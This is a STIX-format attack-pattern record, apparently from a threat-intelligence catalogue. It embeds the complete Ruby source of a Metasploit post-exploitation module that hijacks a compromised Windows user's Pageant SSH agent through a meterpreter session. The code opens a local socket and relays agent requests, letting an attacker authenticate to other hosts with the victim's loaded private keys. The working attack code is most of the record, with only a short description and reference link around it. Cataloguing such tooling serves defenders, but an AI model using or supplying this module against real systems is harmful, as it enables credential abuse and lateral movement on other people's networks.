{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cc57394b-3012-4291-9241-a459778aa2e1",
    "created": "2024-08-14T16:33:04.992404Z",
    "modified": "2024-08-14T16:33:04.992408Z",
    "name": "Forward SSH Agent Requests To Remote Pageant",
    "description": " This module forwards SSH agent requests from a local socket to a remote Pageant instance. If a target Windows machine is compromised and is running Pageant, this will allow the attacker to run normal OpenSSH commands (e.g. ssh-add -l) against the Pageant host which are tunneled through the meterpreter session. This could therefore be used to authenticate with a remote host using a private key which is loaded into a remote user's Pageant instance without ever having knowledge of the private key itself.  Note that this requires the PageantJacker meterpreter extension, but this will be automatically loaded into the remote meterpreter session by this module if it is not already loaded.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/forward_pageant.rb",
            "external_id": "forward_pageant.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'tmpdir'\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Windows::ExtAPI\n  include Msf::Post::Windows::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Forward SSH Agent Requests To Remote Pageant',\n        'Description' => %q{\n          This module forwards SSH agent requests from a local socket to a remote Pageant instance.\n          If a target Windows machine is compromised and is running Pageant, this will allow the\n          attacker to run normal OpenSSH commands (e.g. ssh-add -l) against the Pageant host which are\n          tunneled through the meterpreter session. This could therefore be used to authenticate\n          with a remote host using a private key which is loaded into a remote user's Pageant instance,\n          without ever having knowledge of the private key itself.\n\n          Note that this requires the PageantJacker meterpreter extension, but this will be automatically\n          loaded into the remote meterpreter session by this module if it is not already loaded.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Stuart Morgan <stuart.morgan[at]mwrinfosecurity.com>',\n          'Ben Campbell', # A HUGE amount of support in this :-)\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              extapi_pageant_send_query\n            ]\n          }\n        }\n      )\n    )\n    register_options([\n      OptString.new('SocketPath', [false, 'Specify a filename for the local UNIX socket.', nil])\n    ])\n  end\n\n  def sockpath\n    @sockpath ||= \"#{Dir.tmpdir}/#{Rex::Text.rand_text_alphanumeric(8)}\"\n  end\n\n  def run\n    # Check to ensure that UNIX sockets are supported\n    begin\n      ::UNIXServer\n    rescue NameError\n      fail_with(Failure::BadConfig, 'This module is only supported on a Metasploit installation that supports UNIX sockets.')\n    end\n\n    unless session.commands.include?(Rex::Post::Meterpreter::Extensions::Extapi::COMMAND_ID_EXTAPI_PAGEANT_SEND_QUERY)\n      fail_with(Failure::BadConfig, 'Session does not support Meterpreter ExtAPI Pageant queries')\n    end\n\n    # Get the socket path from the user supplied options (or leave it blank to get the plugin to choose one)\n    if datastore['SocketPath']\n      # Quit if the file exists, so that we don't accidentally overwrite something important on the host system\n      if ::File.exist?(datastore['SocketPath'].to_s)\n        fail_with(Failure::BadConfig, \"Socket (#{datastore['SocketPath']}) already exists. Remove it or choose another path and try again.\")\n      end\n      @sockpath = datastore['SocketPath'].to_s\n    end\n\n    # Open the socket and start listening on it. Essentially now forward traffic between us and the remote Pageant instance.\n    ::UNIXServer.open(sockpath) do |serv|\n      File.chmod(0o0700, sockpath)\n\n      print_status(\"Launched listening socket on #{sockpath}\")\n      print_status(\"Set SSH_AUTH_SOCK variable to #{sockpath} (e.g. export SSH_AUTH_SOCK=\\\"#{sockpath}\\\")\")\n      print_status('Now use any SSH tool normally (e.g. ssh-add)')\n\n      while (s = serv.accept)\n        begin\n          while (socket_request_data = s.recvfrom(8192)) # 8192 = AGENT_MAX\n            break if socket_request_data.nil?\n\n            data = socket_request_data.first\n\n            break if data.nil? || data.empty?\n\n            vprint_status(\"PageantJacker: Received data from socket (size: #{data.size})\")\n\n            response = session.extapi.pageant.forward(data, data.size)\n\n            unless response[:success]\n              print_error(\"PageantJacker: Unsuccessful response received (#{translate_error(response[:error])})\")\n              next\n            end\n\n            vprint_status(\"PageantJacker: Response received (Success='#{response[:success]}' Size='#{response[:blob].size}' Error='#{translate_error(response[:error])}')\")\n\n            begin\n              s.send(response[:blob], 0)\n            rescue StandardError\n              break\n            end\n          end\n        rescue Errno::ECONNRESET\n          vprint_status('PageantJacker: Received reset from client, ignoring.')\n        end\n      end\n    end\n  end\n\n  def cleanup\n    return unless @sockpath\n\n    # Remove the socket that we created, if it still exists\n    ::File.delete(@sockpath) if ::File.exist?(@sockpath)\n  ensure\n    super\n  end\n\n  def translate_error(errnum)\n    errstring = \"#{errnum}: \"\n    case errnum\n    when 0\n      errstring + 'No error'\n    when 1\n      errstring + 'The Pageant request was not processed.'\n    when 2\n      errstring + 'Unable to obtain IPC memory address.'\n    when 3\n      errstring + 'Unable to allocate memory for Pageant<-->Meterpreter IPC.'\n    when 4\n      errstring + 'Unable to allocate memory buffer.'\n    when 5\n      errstring + 'Unable to build Pageant request string.'\n    when 6\n      errstring + 'Pageant not found.'\n    when 7\n      errstring + 'Not forwarded.'\n    else\n      errstring + 'Unknown.'\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}